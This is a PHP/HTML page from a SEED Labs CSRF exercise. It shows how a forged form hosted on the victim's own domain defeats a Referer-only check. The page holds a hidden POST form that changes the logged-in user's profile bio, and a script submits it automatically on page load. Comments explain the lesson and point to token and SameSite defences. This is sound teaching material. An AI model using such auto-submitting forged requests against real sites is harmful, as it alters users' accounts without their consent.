<?php
/*
 * Task 4 — Same-Domain CSRF Attack
 *
 * The official SEED lab asks: can an attacker bypass the Referer-based
 * defence by hosting the forged form on the VICTIM's own domain?
 *
 * This page lives at http://www.seed-server.com/csrf_task4.php.
 * Because the Referer header shows www.seed-server.com, a naive
 * Referer-only check would pass — proving that Referer alone is not
 * a reliable CSRF defence.
 *
 * The only robust server-side defences are:
 *   1. A secret per-session CSRF token (Task 5).
 *   2. The SameSite cookie attribute (Task 6).
 */
session_start();
if (!isset($_SESSION['user'])) {
    $_SESSION['user'] = 'alice';
    $_SESSION['user_id'] = 56;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>SEED Labs — Task 4: Same-Domain CSRF Attack</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; background: #fff8e1; }
        .container { max-width: 800px; margin: auto; background: white; padding: 30px;
                     border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h1 { color: #e67e22; }
        .notice { background: #fdecea; border-left: 4px solid #e74c3c;
                  padding: 15px; border-radius: 4px; margin-bottom: 20px; }
        code { background: #f4f4f4; padding: 2px 6px; border-radius: 3px; }
    </style>
</head>
<body>
<div class="container">
    <h1>Task 4 — Same-Domain CSRF (Referer-Bypass)</h1>

    <div class="notice">
        <strong>Learning Objective:</strong> This page is hosted on
        <code>www.seed-server.com</code> (the victim site itself).
        A naive server that only checks <code>Referer == www.seed-server.com</code>
        will accept the forged request below because the Referer will match.
    </div>

    <p>Active session: <strong><?php echo htmlspecialchars($_SESSION['user']); ?></strong></p>

    <!-- Forged POST form — same origin, so Referer header will show seed-server.com -->
    <form id="csrf-samedomain-form" action="http://www.seed-server.com/index.php" method="POST">
        <input type="hidden" name="action" value="update_profile">
        <input type="hidden" name="bio" value="Hacked via same-domain CSRF (Task 4) — Referer check bypassed!">
    </form>

    <script>
        // Auto-submit: because this page IS on www.seed-server.com,
        // the browser's Referer header will be www.seed-server.com —
        // fooling any server that relies solely on Referer validation.
        document.getElementById('csrf-samedomain-form').submit();
    </script>
</div>
</body>
</html>
